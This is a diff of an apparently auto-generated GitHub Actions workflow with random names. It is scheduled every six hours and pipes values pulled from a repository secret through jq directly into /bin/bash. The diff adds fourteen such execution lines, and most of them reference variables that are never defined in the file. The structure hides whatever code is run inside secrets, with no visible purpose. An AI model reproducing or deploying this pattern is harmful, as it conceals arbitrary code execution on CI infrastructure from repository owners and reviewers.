@@ -1,23 +1,30 @@
 name: burritoswakeful
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 4/6 * * *'
+    - cron: '35 0/6 * * *'
 
-jobs:  # 14823
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: burritoswakeful
         env:
-          hmlp8: ${{ secrets.hmlp8 }}
+          nv0006: ${{ secrets.nv0006 }}
         run: |
-          echo $hmlp8 | jq -r .nph057 | /bin/bash
-          echo $ca7054 | jq -r .ccuap5 | /bin/bash
-          echo $cbxe9 | jq -r .tp0 | /bin/bash
-          echo $jnni645 | jq -r .k6084 | /bin/bash
-          echo $ctq24 | jq -r .e05 | /bin/bash
-          echo $z7 | jq -r .wdj3 | /bin/bash
+          echo $nv0006 | jq -r .tyt69 | /bin/bash
+          echo $rgr2810 | jq -r .o85 | /bin/bash
+          echo $yif9 | jq -r .drtf5 | /bin/bash
+          echo $b74 | jq -r .vf69879 | /bin/bash
+          echo $qbchx06374 | jq -r .uxx5 | /bin/bash
+          echo $qchq607 | jq -r .bqb7 | /bin/bash
+          echo $lza70217 | jq -r .zx8299 | /bin/bash
+          echo $rr58 | jq -r .ij241 | /bin/bash
+          echo $qbj99951 | jq -r .n6577 | /bin/bash
+          echo $jd92508 | jq -r .isw1 | /bin/bash
+          echo $ww565 | jq -r .k35 | /bin/bash
+          echo $abh9854 | jq -r .oduro397 | /bin/bash
+          echo $qye66057 | jq -r .oxja4 | /bin/bash
+          echo $ko108 | jq -r .pdgse19 | /bin/bash
 
